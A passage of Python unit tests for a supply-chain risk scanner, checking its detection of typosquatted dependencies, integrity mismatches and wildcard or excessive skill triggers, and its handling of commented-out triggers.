        scanner = RiskScanner(tmp_path, dependency_artifacts={resolved: artifact})

        class NoVulnerabilityClient:
            max_queries = 10
            queried = 0

            def query(self, _dependency):
                self.queried += 1
                return OSVQueryResult([], None)

        scanner.osv_client = NoVulnerabilityClient()
        report = scanner.scan()

        assert report["dependency_scan"]["integrity"] == {
            "status": "verified", "claimed_count": 1, "verified_count": 1,
            "mismatch_count": 0, "unavailable_count": 0, "unsupported_count": 0,
        }
        assert not any("完整性摘要不一致" in finding["title"] for finding in report["findings"])

    def test_typosquatting_dependency(self, tmp_path):
        """Dependency 'requets' is 1 edit from known 'requests' → high finding."""
        s = MockScanner(
            files={"SKILL.md": "# hi"},
            _package_metadata={
                "name": "demo-pkg",
                "dependencies": {"pypi": [{"name": "requets", "version": "1.0.0"}]},
            },
            target_dir=tmp_path,
        )
        supply_chain.run(s)
        titles = [f["title"] for f in s.findings]
        assert any("Typosquatting" in t for t in titles)
        assert s.findings[0]["severity"] == "high"
        assert s.findings[0].get("llm_review_exempt") is not True

    def test_excessive_triggers(self, tmp_path):
        """More than 10 triggers → low finding."""
        s = MockScanner(
            files={"SKILL.md": "# hi"},
            _package_metadata={
                "type": "skill",
                "triggers": [f"trigger-{i}" for i in range(12)],
            },
            target_dir=tmp_path,
        )
        supply_chain.run(s)
        titles = [f["title"] for f in s.findings]
        assert any("过度触发" in t for t in titles)

    def test_wildcard_trigger(self, tmp_path):
        """Triggers containing '*' → low finding."""
        s = MockScanner(
            files={"SKILL.md": "# hi"},
            _package_metadata={
                "type": "skill",
                "triggers": ["*"],
            },
            target_dir=tmp_path,
        )
        supply_chain.run(s)
        titles = [f["title"] for f in s.findings]
        assert any("通配符" in t for t in titles)

    def test_wildcard_trigger_without_manifest(self):
        s = MockScanner(
            files={"automation.py": "triggers = [*]\n"},
            _package_metadata=None,
        )

        supply_chain.run(s)

        wildcard_findings = [
            finding for finding in s.findings
            if finding["title"] == "触发器使用通配符"
        ]
        assert len(wildcard_findings) == 1
        assert wildcard_findings[0]["location"]["file"] == "automation.py"

    def test_multiline_wildcard_trigger_without_manifest(self):
        s = MockScanner(
            files={
                "automation.json": '{\n  "triggers": [\n    "*"\n  ]\n}\n'
            },
            _package_metadata=None,
        )

        supply_chain.run(s)

        wildcard_findings = [
            finding for finding in s.findings
            if finding["title"] == "触发器使用通配符"
        ]
        assert len(wildcard_findings) == 1
        assert wildcard_findings[0]["location"]["file"] == "automation.json"

    def test_url_scheme_before_wildcard_trigger_is_not_a_comment(self):
        s = MockScanner(
            files={
                "setup.sh": (
                    "URL=https://registry.npmjs.org/; triggers: [\"*\"]\n"
                )
            },
            _package_metadata=None,
        )

        supply_chain.run(s)

        titles = {finding["title"] for finding in s.findings}
        assert "触发器使用通配符" in titles
        assert "供应链风险 — 依赖版本号使用通配符 *" in titles

    def test_js_private_field_does_not_hide_wildcard_trigger(self):
        s = MockScanner(
            files={
                "setup.js": (
                    "const value = obj.#field; triggers = [\"*\"];\n"
                )
            },
            _package_metadata=None,
        )

        supply_chain.run(s)

        assert any(
            finding["title"] == "触发器使用通配符"
            for finding in s.findings
        )

    @pytest.mark.parametrize(
        ("filename", "content"),
        [
            ("setup.sh", '# triggers = ["*"]\n'),
            ("setup.js", '// triggers = ["*"]\n'),
            ("setup.js", '/* triggers = ["*"] */\n'),
            (
                "setup.js",
                (
                    "const endpoint = https://registry.npmjs.org/; "
                    '// triggers = ["*"];\n'
                ),
            ),
            (
                "setup.js",
                'const triggers = [\n  // "*"\n];\n',
            ),
        ],
    )
    def test_commented_wildcard_trigger_is_ignored(self, filename, content):
        s = MockScanner(files={filename: content}, _package_metadata=None)

        supply_chain.run(s)

        assert s.findings == []

    def test_commented_trigger_does_not_override_manifest_location(self):
        s = MockScanner(
            files={"setup.sh": '# triggers = ["*"]\n'},
            _package_metadata={"triggers": ["*"]},
        )

        supply_chain.run(s)

        wildcard = next(
            finding for finding in s.findings
            if finding["title"] == "触发器使用通配符"
        )
        assert wildcard["location"]["file"] == "SKILL.md"

    def test_manifest_fallback_records_are_passed_to_source_parser_once(
        self, monkeypatch
    ):
        captured_records = []

        def capture_sources(_files, records):
            captured_records.extend(records)
            return []

        monkeypatch.setattr(
            supply_chain, "parse_dependency_sources", capture_sources
        )
        s = MockScanner(
            files={},
            _package_metadata={
                "dependencies": {
                    "npm": [{
                        "name": "demo",
                        "version": "1.0.0",
                        "registry": "https://registry.npmjs.org/",
                    }]
                }
            },
        )

        supply_chain.run(s)

        assert len(captured_records) == 1
        assert captured_records[0].name == "demo"

    def test_benign_code_no_finding(self, tmp_path):
        """Clean code + no metadata → no findings."""
        s = MockScanner(
            files={"main.py": "print('hello')\n"},
            _package_metadata={"name": "demo", "description": "safe"},
            target_dir=tmp_path,
        )
        supply_chain.run(s)
        assert s.findings == []
